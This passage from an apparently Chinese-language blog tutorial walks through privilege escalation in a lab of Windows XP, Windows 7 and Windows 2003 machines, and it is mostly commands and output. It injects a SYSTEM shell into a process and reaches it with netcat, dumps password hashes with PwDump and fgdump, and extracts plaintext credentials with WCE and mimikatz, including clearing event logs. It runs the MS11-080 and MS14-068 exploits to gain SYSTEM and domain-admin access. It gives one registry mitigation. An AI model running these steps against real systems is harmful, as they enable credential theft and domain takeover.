src="https://img-blog.csdnimg.cn/20190413165041110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="2-注入进程提权"><a href="#2-注入进程提权" class="headerlink" title="2.注入进程提权"></a>2.注入进程提权</h4><ul><li>pinjector.exe</li></ul><p>下载：<a href="https://www.tarasco.org/security/Process_Injector/：" target="_blank" rel="noopener">https://www.tarasco.org/security/Process_Injector/：</a></p><ul><li>下载之后解压使用其中的 PsExec 放在C盘根目录</li></ul><p><img src="https://img-blog.csdn.net/20180228204907249?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvS2V2aW5oYW5zZXI=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><ul><li>列出可注入进程及其信息<ul><li>C:&gt;pinjector.exe</li><li>C:&gt;pinjector.exe -l</li></ul></li><li>找一个未使用端口<ul><li>C:&gt;netstat -nao | find “555” </li><li>无结果表示未使用</li></ul></li><li>选择一个进程注入</li></ul><pre><code>  C:\&gt;pinjector.exe -l      PID    668 services.exe ( 16 Threads)  USER: \\NT AUTHORITY\SYSTEM  C:\&gt;pinjector.exe -p 668 cmd 555      Privilege Switcher for Win32(Private version)      (c) 2006 Andres Tarasco - atarasco@gmail.com      [+] Trying to execute cmd to 668 as: ? \      [+] Code inyected... ; )</code></pre><ul><li>查看被注入的进程的监听状态</li></ul><pre><code>  C:\&gt;netstat -nao | find &quot;555&quot;      TCP    0.0.0.0:555            0.0.0.0:0              LISTENING       668</code></pre><ul><li>查看被注入的进程的监听状态</li></ul><pre><code>  C:\&gt;netstat -nao | find &quot;555&quot;      TCP    0.0.0.0:555            0.0.0.0:0              LISTENING       668</code></pre><ul><li>利用此监听端口</li></ul><pre><code>  root@kali：~# nc -nv 10.10.10.128 555      Connection to 10.10.10.128 555 port [tcp/*] succeeded!      Microsoft Windows XP [?汾 5.1.2600]      (C) ??????? 1985-2001 Microsoft Corp  C:\WINDOWS\system32&gt;whoami      whoami      SYSTEM</code></pre><ul><li>查看进程</li></ul><pre><code>  使用 SysinternalsSuite/procexp.exe 查看进程</code></pre><p><img src="https://img-blog.csdn.net/20180228204920586?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvS2V2aW5oYW5zZXI=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="3-读取windows本地密码"><a href="#3-读取windows本地密码" class="headerlink" title="3.读取windows本地密码"></a>3.读取windows本地密码</h4><h5 id="1-抓包嗅探"><a href="#1-抓包嗅探" class="headerlink" title="1. 抓包嗅探"></a>1. 抓包嗅探</h5><ol><li>Windows<ul><li>Wireshark</li><li>Omnipeek</li><li>Commview</li><li>Sniffpass：抓取密码相关的数据包</li></ul></li><li>Linux<ul><li>Tcpdump</li><li>Wireshark</li><li>Dsniff：抓取密码相关的数据包</li></ul></li></ol><h5 id="2-键盘记录本地密码"><a href="#2-键盘记录本地密码" class="headerlink" title="2. 键盘记录本地密码"></a>2. 键盘记录本地密码</h5><ul><li>可以使用木马软件 DarkCometRAT</li><li>在控制目标主机之后可以监控键盘记录信息</li></ul><h5 id="3-查看本地缓存密码"><a href="#3-查看本地缓存密码" class="headerlink" title="3.查看本地缓存密码"></a>3.查看本地缓存密码</h5><ul><li>在浏览器查看缓存密码</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165110693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>windows 密码恢复工具</p><ul><li><a href="http://www.nirsoft.net/password_recovery_tools.html" target="_blank" rel="noopener">Windows Password Recovery Tools</a></li></ul></li><li><p>使用 Pwdump 查看 windows 本地登录密码</p><ul><li>windows 登录密码保存在 C:\Windows\System32\config\SAM 文件中</li><li>pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li><li>添加用户</li></ul><pre><code>  C:\Documents and Settings\kevin&gt;net user user2 123456 /add  C:\Documents and Settings\kevin&gt;net user      \\ICST-WINATT 的用户帐户      -------------------------------------------------------------      Administrator            Guest                    HelpAssistant      kevin                    SUPPORT_388945a0         test      user1                    user2  C:\Documents and Settings\kevin&gt;cd \  C:\&gt;PwDump.exe localhost      Administrator:500:18D583B495C4696AFF17365FAF1FFE89:5D36F0CA14EEBEF32F55C7B6A4675DB0:::      Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::      HelpAssistant:1000:5906F3A72959D5902440275BA555A537:10AA20D63C3EC71E0102AC95ADF6DF73:::      kevin:1004:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::      SUPPORT_388945a0:1002:NO PASSWORD*********************:8AFA81401E8D8EBFA42B4E46F6507C07:::      test:1005:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::      user1:1006:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::      user2:1007:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::Completed.  # 结果：前部分是 LMHASH ，后部分是 NTLMHASH</code></pre><ul><li><p>可以将结果保存在文件中，然后在 kali 中进行破解</p><p><img src="https://img-blog.csdnimg.cn/20190413165117218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul></li></ul><h4 id="WCE-WINDOWS-CREDENTIAL-EDITOR"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h4><ul><li>WINDOWS身份认证过程</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165135348.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="WCE-WINDOWS-CREDENTIAL-EDITOR-1"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR-1" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h5><ul><li>windows 内核中保存有密码明文副本，安全机制较低</li><li>需要管理员权限</li><li>工具保持在 kali 的 /usr/share/wce/wce-universal # 通用格式是自动识别32位和64位</li><li>多用户登录目标主机</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165139664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>列举登录账号及会话</li></ul><pre><code>  C:\&gt;wce-universal.exe -lv      0020B19D:user1:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0      # 与 C:\&gt;PwDump.exe localhost 结果相同</code></pre><ul><li><p>每隔5秒刷新一次</p><ul><li>wce-universal.exe -r</li></ul></li><li><p>删除登录会话</p><pre><code>  C:\&gt;wce-universal.exe -d 0020B19D  C:\&gt;wce-universal.exe -lv      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0</code></pre></li><li><p>计算密码对应的 HASH 值</p></li></ul><pre><code>  C:\&gt;wce-universal.exe -g passwd      Password:   passwd      Hashes:     91C7AE7122196B5EAAD3B435B51404EE:22315D6ED1A7D5F8A7C98C40E9FA2DEC</code></pre><ul><li>读取内核中的明文密码</li></ul><pre><code>  C:\&gt;wce-universal.exe -w      user1\ICST-WINATT:123456      user2\ICST-WINATT:123456      test\ICST-WINATT:123456      kevin\ICST-WINATT:123456      NETWORK SERVICE\MSHOME:  C:\&gt;net user user1 111222      命令成功完成。  C:\&gt;wce-universal.exe -w      user1\ICST-WINATT:123456      user2\ICST-WINATT:123456      test\ICST-WINATT:123456      kevin\ICST-WINATT:123456      NETWORK SERVICE\MSHOME:  # 当前内核中保存的值会在下次登录被读取出来</code></pre><ul><li>对 LUID 进行修改（将LUID改为匹配其他用户的用户名和密码）</li></ul><pre><code>  C:\&gt;wce-universal.exe -lv      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0  C:\&gt;wce-universal.exe -i 001E5D92 -s kevin:ICST-    WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      Changing NTLM credentials of logon session 001E5D92h to:      Username: kevin      domain: ICST-WINATT      LMHash: 44EFCE164AB921CAAAD3B435B51404EE      NTHash: 32ED87BDB5FDC5E9CBA88547376818D4      NTLM credentials successfully changed!  C:\&gt;wce-universal.exe -lv      001E5D92:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0</code></pre><ul><li><p>Win7 及 之前默认 都可遭受 WCE 攻击</p><ul><li>防范方法：修改注册表</li></ul><pre><code>  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code></pre><ul><li>删除 wdigest 之后重启计算机</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165146599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><h5 id="fgdump"><a href="#fgdump" class="headerlink" title="fgdump"></a>fgdump</h5><ul><li>PwDump localhost<ul><li>位置：Pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li></ul></li><li>fgdump<ul><li>位置：Pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/<br>放在 WinXP 中， 双击或在命令行执行 fgdump.exe 会自动生成三个文件，文件中保存着密码</li></ul></li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165151759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><ul><li>在 kali 中的路径 /usr/share/mimikatz，将 win32 复制到 windows 主机</li></ul><pre><code>  C:\Win32&gt;mimikatz.exe  查看帮助是：：  mimikatz # ::              standard  -  Standard module  [Basic commands (does not require module name)]                crypto  -  Crypto Module              sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]              kerberos  -  Kerberos package module  []             privilege  -  Privilege module               process  -  Process module               service  -  Service module               lsadump  -  LsaDump module                    ts  -  Terminal Server module                 event  -  Event module                  misc  -  Miscellaneous module                 token  -  Token manipulation module                 vault  -  Windows Vault/Credential module           minesweeper  -  MineSweeper module                   net  -                 dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]             busylight  -  BusyLight Module                sysenv  -  System Environment Value module                   sid  -  Security Identifiers module                   iis  -  IIS XML Config module                   rpc  -  RPC control of mimikatz              mimikatz # privilege::              Module :        privilege              Full name :     Privilege module                 debug  -  Ask debug privilege            * *                driver  -  Ask load driver privilege              security  -  Ask security privilege                   tcb  -  Ask tcb privilege                backup  -  Ask backup privilege               restore  -  Ask restore privilege                sysenv  -  Ask system environment privilege                    id  -  Ask a privilege by its id                  name  -  Ask a privilege by its name  mimikatz # privilege::debug  mimikatz # sekurlsa::  mimikatz # sekurlsa::logonPasswords  mimikatz # sekurlsa::wdigest  mimikatz # process::list  mimikatz # lsadump::sam  mimikatz # lsadump::cache  mimikatz # ts::multirdp  mimikatz # event::clear  mimikatz # event::drop  mimikatz # misc::regedit  mimikatz # token::whoami</code></pre><h3 id="提权——利用漏洞提权"><a href="#提权——利用漏洞提权" class="headerlink" title="提权——利用漏洞提权"></a>提权——利用漏洞提权</h3><h5 id="1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限"><a href="#1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限" class="headerlink" title="1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限"></a>1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限</h5><ul><li><p>Ms011-080 对应补丁 Kb2592799</p><p><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">微软官网公告(https://technet.microsoft.com/library/security/ms11-080)</a></p><p><img src="https://img-blog.csdnimg.cn/20190413165237322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><pre><code> root@kali:~# searchsploit Ms11-080     ------------------------------------------ --------------------------------      Exploit Title                            |  Path                                               | (/usr/share/exploitdb/)     ------------------------------------------ --------------------------------     Microsoft Windows - &#39;AfdJoinLeaf&#39; Local P | exploits/windows/local/21844.rb     Microsoft Windows XP/2003 - &#39;afd.sys&#39; Loc | exploits/windows/local/18176.py     ------------------------------------------ -------------------------------- root@kali:~# cp /usr/share/exploitdb/exploits/windows/local/18176.py . # 将文件拷贝到 英文版 WinXP 系统(有时候中文版 XP 也可以使用) # 首先查看 WinXP 是否安装了 对应更新 Kb2592799 WinXP -&gt; 运行 -&gt; appwiz.cpl -&gt; 查看是否有安装 Kb2592799，有的话卸载掉</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165247833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p> 查看 WinXP下的文件路径</p><p><img src="https://img-blog.csdnimg.cn/20190413165254957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>1.WinXP 上安装的 python 的运行环境<br>C:\Documents and Settings\kevin&gt;cd \</p><pre><code>  C:\&gt;18176.py -O XP</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165302568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>  启动任务管理器</p><p><img src="https://img-blog.csdnimg.cn/20190413165311388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>  结束 kevin 权限的 explorer 桌面程序</p><p><img src="https://img-blog.csdnimg.cn/20190413165317715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>  输入 explorer</p><p><img src="https://img-blog.csdnimg.cn/2019041316532377.png" alt="在这里插入图片描述"></p><p>  启动 system 权限的 explorer 桌面程序</p><p><img src="https://img-blog.csdnimg.cn/20190413165333649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.WinXP 无需安装 Pyhon 的运行环境</p><pre><code>  # 使用 python2 的 pyinstaller 将 python 文件进行打包  root@kali:~# apt-get install python-pip  root@kali:~# pip install pyinstaller  # 或者 WinXP 下，安装 python2.7  C:\&gt;pyinstaller --onefile 18176.py      297 INFO: Building EXE from out00-EXE.toc      297 INFO: Appending archive to EXE C:\dist\18176.exe      328 INFO: Building EXE from out00-EXE.toc completed successfully.</code></pre><p><img src="https://img-blog.csdnimg.cn/2019041316534468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>  # 打开文件目录，将文件复制到目标主机  C:\&gt;whoami      test  C:\&gt;net user test      本地组成员             *Users      全局组成员             *None  # 查看文件位置</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165353673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>     C:\&gt;cd 111     C:\111&gt;18176.exe -O XP</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165402710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>     C:\WINDOWS\system32&gt;whoami         SYSTEM     # 将自己添加为管理员组     C:\WINDOWS\system32&gt;net localgroup administrators test /add         命令成功完成。</code></pre><p>2.用 Ms11-046 时目标主机蓝屏(Dos)</p><h5 id="2-Win7-使用-Ms14-068-获取-域控制器的权限"><a href="#2-Win7-使用-Ms14-068-获取-域控制器的权限" class="headerlink" title="2.Win7 使用 Ms14-068 获取 域控制器的权限"></a>2.Win7 使用 Ms14-068 获取 域控制器的权限</h5><ul><li><p>使用 win2003 搭建域控制器</p><ul><li><p>配置并连接域控制器</p><ul><li>运行 -&gt; dcpromo</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165412201.png" alt="在这里插入图片描述"></p></li></ul></li></ul><pre><code>     # Win2003 设置成域控制器，配置静态 IP 地址     # Win2003 设置强密码     C:\&gt;net user Administrator jlcssadmin2006...     # Win7 设置 静态 IP    并将 DNS 设置为 Win2003 的IP地址     # Win7 加入域控制器    </code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165420295.png" alt="在这里插入图片描述"></p><p>​    <img src="https://img-blog.csdnimg.cn/20190413165426948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20190413165431859.png" alt="在这里插入图片描述"></p><p>重启之后</p><p><img src="https://img-blog.csdnimg.cn/20190413165438137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>修改 Win2003 中的域控制器的用户权限</p><ul><li>Win2003 -&gt; 运行 -&gt; dsa.msc</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165456477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165500666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>Win7</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165516801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>win2003</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165521164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>Win7 可以查看域控制器共享出来的文件等资源</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165527351.png" alt="在这里插入图片描述"></p><ul><li><p>使用漏洞代码攻击域控制器</p><ul><li><p>获取攻击文件</p><pre><code>  # root@kali:~# searchsploit Ms14-068      ------------------------------------------ ----------------------------------       Exploit Title                            |  Path                                | (/usr/share/                    exploitdb/)      ------------------------------------------ ----------------------------------      Microsoft Windows Kerberos - Privilege Es | exploits/windows/remote/35474.py      ------------------------------------------ ---------------------------------  root@kali:~# cp /usr/share/exploitdb/exploits/windows/remote/35474.py .</code></pre></li><li><p>域环境下使用通用工具查看本地密码</p></li></ul><pre><code>  C:\fgdump&gt;PwDump.exe localhost    # 仅是本地密码  C:\&gt;wce-universal.exe    # 结果是域控制器密码  C:\&gt;wce-universal.exe -w      Administrator\LAB:jlcssadmin  C:\Win32&gt;mimikatz.exe  mimikatz # ::  mimikatz # privilege::debug      Privilege &#39;20&#39; OK  mimikatz # kerberos::list  mimikatz # sekurlsa::logonPasswords</code></pre><ul><li>漏洞利用过程</li></ul><pre><code>  1. 首先在 kali 通过脚本生成一个票据文件      # ms14-068.py -u user@lab.com -s userSID -d dc.lab.com      -u 用户名:登录用户名      -s userSID      -d 域控制器名称：在 Win7 计算机名称处查看，不在域控是，可以用IP地址代替  2. 将票据文件拷贝到 win 系统里      # 拷贝 TGT_user1@lab.com.ccache 到windows系统  3. 在 win 系统里使用 mimikatz.exe 完成权限的提升      # mimikatz.exe log &quot;kerberos::ptc TGT_user@lab.com.ccache&quot; exit  # 在 Win7 上使用本地用户登录  # 查看域账号的信息  C:\&gt;net user      \\WIN7-VM 的用户帐户      Administrator            Guest                    John      user1                    user2      命令成功完成。  C:\Win32&gt;whoami.exe /all      [User]     = &quot;LAB\user3&quot;  S-1-5-21-3056505427-3800332898-2304591883-1111  # kali 报错缺少模块  root@kali:~# python 35474.py -u user3@lab.com -s S-1-5-21-3056505427-3800332898-2304591883-1111 -d 172.16.10.132  # 下载安装模块https://github.com/bidord/pykek</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165535193.png" alt="在这里插入图片描述"></p></li></ul><pre><code>     root@kali:~/Desktop/pykek-master# python ms14-068.py -u user3@lab.com -s S-1-5-21-3056505427-3800332898-2304591883-1111 -d 172.16.10.132     Password:        [+] Building AS-REQ for 172.16.10.132... Done!       [+] Sending AS-REQ to 172.16.10.132... Done!       [+] Receiving AS-REP from 172.16.10.132... Done!       [+] Parsing AS-REP from 172.16.10.132... Done!       [+] Building TGS-REQ for 172.16.10.132... Done!       [+] Sending TGS-REQ to 172.16.10.132... Done!       [+] Receiving TGS-REP from 172.16.10.132... Done!       [+] Parsing TGS-REP from 172.16.10.132... Done!       [+] Creating ccache file &#39;TGT_user1@lab.com.ccache&#39;... Done             # 将文件拷贝到 Win7</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165539296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>     # 在 Win7 下执行     C:\mimikatz\Win32&gt;mimikatz.exe log &quot;kerberos::ptc TGT_user3@lab.com.ccache&quot; exit ![在这里插入图片描述](https://img-blog.csdnimg.cn/2019041316554383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70)     # 如果injecte成功 你有可能获得到了域管理session，那么klist看一下是否有了kerberos Ticket     C:\mimikatz\Win32&gt;klist         当前登录 ID 是 0:0x776bd         缓存的票证: (1)         #0&gt;     客户端: user3 @ LAB.COM             服务器: krbtgt/LAB.COM @ LAB.COM             Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)             票证标志 0x50a00000 -&gt; forwardable proxiable renewable pre_authent             开始时间: 3/4/2018 2:00:45 (本地)             结束时间:   3/4/2018 12:00:44 (本地)             续订时间: 3/11/2018 2:00:44 (本地)             会话密钥类型: RSADSI RC4-HMAC(NT)     C:\mimikatz\Win32&gt;net use \\Win2003.lab.com\admin$         命令成功完成。</code></pre><h5 id="利用-CVE-2012-0056-提升-linux-权限"><a href="#利用-CVE-2012-0056-提升-linux-权限" class="headerlink" title="利用 CVE-2012-0056 提升 linux 权限"></a>利用 CVE-2012-0056 提升 linux 权限</h5><ul><li>是一个关于 /proc/pid/mem 的漏洞</li><li>要求：linux 内核必须大于2.6.39</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165547661.png" alt="在这里插入图片描述"></p><ul><li><p>样例：使用 ubuntu11 系统</p><ul><li><a href="http://old-releases.ubuntu.com/releases/11.10/" target="_blank" rel="noopener">ubuntu11 官网链接（http://old-releases.ubuntu.com/releases/11.10/）</a></li></ul></li><li><p>在 kali 中查询</p><pre><code> root@kali:~# searchsploit 18411     --------------------------- ----------------------------------      Exploit Title             |  Path                                | (/usr/share/exploitdb/)     --------------------------- ----------------------------------     Linux Kernel 2.6.39 &lt; 3.2. | exploits/linux/local/18411.c     --------------------------- ------------------------------- root@kali:~# cp /usr/share/exploitdb/exploits/linux/local/18411.c .</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165552374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><ul><li>下载了 ubuntu11，安装之后 ssh 没办法使用，文件无法导入，故无法演示 ，过程是这样的，使用 kali-1.1.0 演示一下结kali-1.1.0 已经打了这个漏洞的补丁了，故无结果。</li></ul><h3 id="提权——利用配置不当提权"><a href="#提权——利用配置不当提权" class="headerlink" title="提权——利用配置不当提权"></a>提权——利用配置不当提权</h3><ul><li>与漏洞提权相比更常用的方法 <ul><li>企业环境 </li><li>补丁更新的全部已经安装 </li><li>输入变量过滤之外更值得研发关注的安全隐患 </li><li>以system权限启动 </li><li>NTFS权限允许users修改删除 </li></ul></li><li>icacls<ul><li>icacls c:\windows*.exe /save perm /T </li><li>i586-mingw32msvc-gcc -o admin.exe admin.c </li></ul></li><li>Find<ul><li>find / -perm 777 -exec ls -l {} ; </li></ul></li><li>应用系统的配置文件 <ul><li>应用连接数据库的配置文件 </li></ul></li></ul><h5 id="1-NTFS权限允许-users-修改删除"><a href="#1-NTFS权限允许-users-修改删除" class="headerlink" title="1. NTFS权限允许 users 修改删除"></a>1. NTFS权限允许 users 修改删除</h5><p><img src="https://img-blog.csdnimg.cn/20190413165618902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img 